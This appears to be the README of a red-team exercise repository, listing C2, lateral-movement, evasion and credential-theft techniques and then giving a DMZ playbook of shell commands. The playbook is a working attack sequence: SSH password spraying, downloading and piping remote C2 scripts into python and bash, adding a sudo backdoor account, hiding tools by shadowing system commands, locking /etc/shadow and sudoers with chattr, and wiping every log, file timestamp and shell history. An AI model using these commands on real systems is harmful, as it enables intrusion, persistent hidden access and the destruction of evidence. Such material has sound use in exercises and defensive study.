# CS2020 repository

#### MSEL concepts:
##### Authenticated C2 via ICMP on Linux and Windows
##### Fallback channels using hardcoded IPs and calculated subnets
##### Proxied lateral movement using PTT/PTH via WMI, RPC/DCOM, SMB, and WinRM 
##### Defense evasion using in-memory payloads, encryption, timestamp modification, and byte randomization
##### Credential access using Mimikittenz, Mimikatz, Minidump, Rubeus, and InternalMonologue
##### Privilege escalation using process injection, parent process spoofing, and token theft

###### DMZ
```txt
# initial access
spraySSH <TARGET> <USERDICTIONARY> <PASSWORDDICTIONARY>

# on penetration, backup C2 and proxy
nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
nohup curl --insecure -sv https://<IP>/c2_python_proxy_server.py|python - & disown

# edit proxychains.conf
localnet 127.0.0.0/255.0.0.0
socks4 <IP> <PORT> <PASSWORD>

# maintaining access, root user and SSH
# passwd root (out of scope)
adduser <c2_NAME>
usermod -aG sudo <c2_NAME>
ssh-keygen -t rsa

# post exploitation
curl --insecure -sv https://<IP>/redghost.sh| bash -
sysctl -w net.ipv4.icmp_echo_ignore_all=1
curl --insecure https://<IP>/icmp_basic_server -o c2_icmp_basic_server && chmod +x c2_icmp_basic_server
mkdir /bin/.usr/ && cd /bin/.usr/ && curl --insecure https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh

# edit c2_bash_hide.sh
THINGTOHIDE=c2

# edit ~/.bashrc
PATH=/bin/.usr/:${PATH}
# file located in first path /bin/.usr/c2_bash_hide.sh 
for f in "netstat" "iptables" "kill" "ps" "pgrep" "pkill" "ls" "rm" "rmdir" "passwd" "shutdown" "chmod" "sudo" "su" "cat" "useradd" "id" "ln" "unlink" "which" "gpasswd" "bash" "sh" "env" "echo" "history" "tcpdump" "chattr" "lsattr" "export" "mv" "grep" "egrep" "find"; do 
	ln -s /bin/.usr/c2_bash_hide.sh /bin/.usr/${f};
done;

# lock files, keep password, encrypt 
for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
  chattr +i ${f};
done;
openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;

# clear timestamps and logs
for f in `find /var/log/ -type f -name "*" 2>/dev/null`; do
  echo "" > ${f} 2>&1> /dev/null;
done;
for f in `find / -type f -name "*" 2>/dev/null`; do
  touch ${f} 2>&1> /dev/null;
done;
history -c && echo "" > ~/.bash_history
```
